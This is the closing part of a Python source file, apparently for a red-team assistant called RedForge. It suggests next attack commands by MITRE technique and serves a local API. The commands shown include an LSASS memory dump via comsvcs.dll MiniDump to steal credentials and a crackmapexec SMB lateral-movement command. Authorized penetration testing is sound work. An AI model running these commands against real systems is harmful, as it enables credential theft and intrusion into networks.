            "command": "powershell -c \"rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full\"",
            "technique": "T1003.001",
            "reason": "High privileges detected in recent activity. Time for credential access.",
            "confidence": "high"
        })

    if any("445" in str(e.metadata) for e in timeline[:5] if e.metadata):
        suggestions.append({
            "command": "crackmapexec smb <TARGET> -u USER -p 'PASSWORD' -d DOMAIN --local-auth",
            "technique": "T1021.002",
            "reason": "SMB was recently discovered. Lateral movement via SMB is a common next step.",
            "confidence": "medium"
        })

    if "lateral" in recent_notes or "psexec" in recent_commands or "winrm" in recent_commands:
        suggestions.append({
            "command": "whoami /all && net user && net localgroup administrators",
            "technique": "T1033",
            "reason": "After lateral movement, always re-enumerate privileges and users on the new host.",
            "confidence": "high"
        })

    # Fallback / general useful commands
    if len(suggestions) < 3:
        suggestions.append({
            "command": "systeminfo && whoami /all && net user",
            "technique": "T1082",
            "reason": "Good general enumeration after any significant action.",
            "confidence": "medium"
        })

    return {"suggestions": suggestions[:5]}


# --------------------------------------------------------------------------- #
# Future endpoints (documented for planning)
# --------------------------------------------------------------------------- #
# POST /recon/hosts
# POST /recon/ports
# POST /report/generate
# POST /attack/search
# POST /llm/analyze-output   (optional, if we proxy local LLM calls through sidecar)


if __name__ == "__main__":
    import uvicorn
    import sys

    port = int(os.getenv("REDFORGE_SIDECAR_PORT", "18765"))

    # When frozen by PyInstaller, NEVER use reload (causes fork bomb via watchfiles).
    # When running from source, reload is convenient for development.
    is_frozen = getattr(sys, "frozen", False)
    use_reload = (not is_frozen) and os.getenv("REDFORGE_DEV") == "1"

    if is_frozen:
        # Pass the app object directly when frozen so uvicorn doesn't try to
        # re-import "engine:app" (which fails inside PyInstaller bundles).
        uvicorn.run(app, host="127.0.0.1", port=port, reload=False)
    else:
        uvicorn.run("engine:app", host="127.0.0.1", port=port, reload=use_reload)
